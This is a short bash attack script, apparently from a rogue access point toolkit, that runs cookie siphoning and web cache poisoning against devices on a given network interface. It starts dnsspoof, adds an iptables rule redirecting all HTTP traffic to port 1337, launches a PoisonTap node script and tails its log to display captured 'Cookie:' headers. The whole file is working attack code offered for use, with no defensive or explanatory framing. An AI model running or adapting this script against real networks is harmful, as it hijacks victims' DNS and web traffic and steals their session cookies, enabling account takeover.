#!/bin/bash

echo '[*] running cookies siphoning and web cache poisoning'

sleep 5 # after captive portal checks

[[ $(pgrep dnsspoof) = '' ]] && {
  #screen -dmS dnsspoof dnsspoof -i "$1" port 53
  dnsspoof -i "$1" port 53 &
}

[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 1337) = '' ]] && {
  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-port 1337
}

[[ $(pgrep -f pi_poisontap.js) = '' ]] && {
  truncate -s 1 /opt/poisontap/poisontap.cookies.log
  #screen -dmS poisontap nodejs /opt/poisontap/pi_poisontap.js
  nodejs /opt/poisontap/pi_poisontap.js &
}

tail -f /opt/poisontap/poisontap.cookies.log | while read line
do
	echo $line | grep 'Cookie:' --color=auto
done